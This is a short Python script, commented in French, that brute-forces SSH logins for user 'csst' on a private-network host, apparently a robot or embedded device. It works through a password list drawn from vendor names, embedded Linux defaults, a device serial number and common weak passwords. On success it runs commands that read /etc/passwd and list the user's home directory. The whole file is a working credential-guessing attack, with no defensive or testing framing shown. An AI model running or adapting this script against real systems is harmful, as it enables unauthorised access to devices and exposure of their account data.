import paramiko

HOST = "10.42.0.1"
USER = "csst"

passwords = [
    # Patterns csst
    "csst", "csst123", "csst1234", "csst12345",
    "Csst123", "CSST123", "csst@123", "Csst@2023",
    "csst_ws", "csst2023", "csst2022",
    # Patterns robot
    "robot", "robot123", "Robot123",
    # Patterns constructeur
    "ciot", "ciot123", "Ciot@123",
    "yutong", "YuTong123",
    "tyjc", "tyjc123",
    # Patterns Linux embarqué courants
    "linaro", "linaro123",
    "ubuntu", "ubuntu123",
    "nvidia", "jetson",
    # Basés sur le numéro de série
    "TY1251D", "ty1251d", "TY1251D03195",
    "03195", "1251", "TY1251",
    # Patterns LTME (LiDAR)
    "ltme", "ltme123",
    # Passwords simples
    "password", "pass123",
    "123456", "1234567",
    "123456789", "12345678",
]

print(f"Test SSH {USER}@{HOST}\n")
for pwd in passwords:
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(HOST, 22, username=USER,
                      password=pwd, timeout=3,
                      look_for_keys=False,
                      allow_agent=False)
        print(f"\n[TROUVÉ !!!] csst:{pwd}")
        stdin, stdout, stderr = client.exec_command(
            "whoami && cat /etc/passwd | grep csst && ls /home/csst/")
        print(stdout.read().decode())
        client.close()
        break
    except paramiko.AuthenticationException:
        print(f"[FAIL] {pwd}")
    except Exception as e:
        print(f"[ERR] {e}")
        break